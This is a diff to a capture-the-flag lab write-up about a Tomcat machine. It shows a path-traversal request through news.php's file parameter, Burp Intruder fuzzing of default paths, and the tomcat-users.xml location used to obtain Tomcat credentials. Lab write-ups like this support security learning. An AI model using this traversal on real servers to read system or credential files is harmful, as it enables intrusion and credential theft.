@@ -157,6 +157,8 @@ mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
 ash:x:1000:1000:clive:/home/ash:/bin/bash
 ```
 
+* Perform fuzzing using BurpSuite. Intercept request, use intruder and place a list of default file locations.
+
 ```
 http://10.10.10.194/news.php?file=../../../../../../etc/issue
 Ubuntu 20.04 LTS \n \l 
@@ -288,3 +290,14 @@ tmpfs /run/snapd/ns tmpfs rw,nosuid,nodev,noexec,relatime,size=203524k,mode=755 
 tmpfs /var/snap/lxd/common/ns tmpfs rw,relatime,size=1024k,mode=700 0 0
 binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc rw,nosuid,nodev,noexec,relatime 0 0
 ```
+* After blindly fuzzing and even installing tomcat 9 to determine the location, I finally found this [page](https://packages.debian.org/sid/all/tomcat9/filelist) which provided info on the default location for Tomcat 9 on debian system. :X
+
+```
+/usr/share/tomcat9/etc/tomcat-users.xml
+```
+![image](https://raw.githubusercontent.com/kookiecrack/images/main/tomcat-pw-tabby.png)
+
+* Successfully obtained the credentials to tomcat.
+
+
+
